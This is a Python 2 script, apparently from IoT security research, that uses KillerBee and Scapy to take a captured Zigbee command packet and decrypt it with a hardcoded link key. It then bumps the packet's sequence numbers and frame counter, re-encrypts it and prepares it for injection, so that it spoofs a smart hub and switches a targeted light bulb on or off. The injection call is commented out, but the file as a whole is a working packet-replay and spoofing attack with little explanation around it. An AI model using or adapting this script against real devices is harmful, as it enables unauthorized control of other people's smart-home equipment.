__author__ = 'Soteria'

# 1. Sniff link-status and route request messages
# 2. Extract relevant sequence numbers:
    ## IEEE sequence number
    ## zigbee NWK sequence number
    ## security header - Frame Counter
# 3. Create new packet:
# 4. Change sequence numbers in the new packet
# 5. Create new packet data
# 6. Encrypt the data with the keyc1
# 7. Inject!

import dill  # In order to save and load packet from file
import logging
log_killerbee = logging.getLogger('scapy.killerbee')
import struct
try:
	from scapy.all import *
except ImportError:
	print 'This Requires Scapy To Be Installed.'
	from sys import exit
	exit(-1)

from killerbee import *
from killerbee.scapy_extensions import *
import InjectionHelper
del hexdump
from scapy.utils import hexdump				# Force using Scapy's hexdump()
import os


# STATIC DEFAULTS:
DEFAULT_KB_CHANNEL = 11
DEFAULT_KB_DEVICE = '10.10.10.2'
SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked
command_packet_file = "command_packet_format"
TURN_ON_COMMAND_CODE = '\x01'
TURN_OFF_COMMAND_CODE = '\x00'
LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'


# DYNAMIC DEFAULTS:
DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER = 170
DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM = 56
ieee_seq_num = 42
zigbeeNWK_seq_num = 47
zigbee_frame_counter = 836867

# Load command packet from file:
encrypted_command_packet = dill.load(open(command_packet_file))

# Save packet
#dill.dump(lastPacket, open(command_packet_file, "w"))

InjectionHelper.print_string_as_packet("Loaded packet", encrypted_command_packet.do_build().encode('hex'))

print "Decrypting message..."
# Extracting the MIC from the packet payload:
encrypted_command_packet.mic = encrypted_command_packet.payload.payload.payload.fields['data'][-6:-2]
# Storing the MIC to fix 3's bug later in the dev_sewio.py:
InjectionHelper.MY_HEX_MIC = str(encrypted_command_packet.mic)
# Omitting the data by 6 (to get rid of the FCS + MIC):
encrypted_command_packet.payload.payload.payload.fields['data'] = encrypted_command_packet.payload.payload.payload.fields['data'][:-6]
# Decrypting:
decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
print ""


# Advance injected packet sequence numbers
next_ieee_seq_num = ieee_seq_num + 1
next_zigbeeNWK_seq_num = zigbeeNWK_seq_num + 2
next_zigbee_frame_counter = zigbee_frame_counter + 1
next_zigbee_app_counter = DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER + 1
next_zigbee_cluster_seq_num = DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM + 1


# Update fields upon crafted sequence numbers:
decrypted_command_packet_payload.payload.fields['transaction_sequence'] = next_zigbee_cluster_seq_num
decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_counter
encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter


print "Encrypting message..."
encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
print ""

print "Injecting packet..."
InjectionHelper.print_string_as_packet("Packet data", encrypted_command_packet_to_inject.do_build().encode('hex'))

print ""
#kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)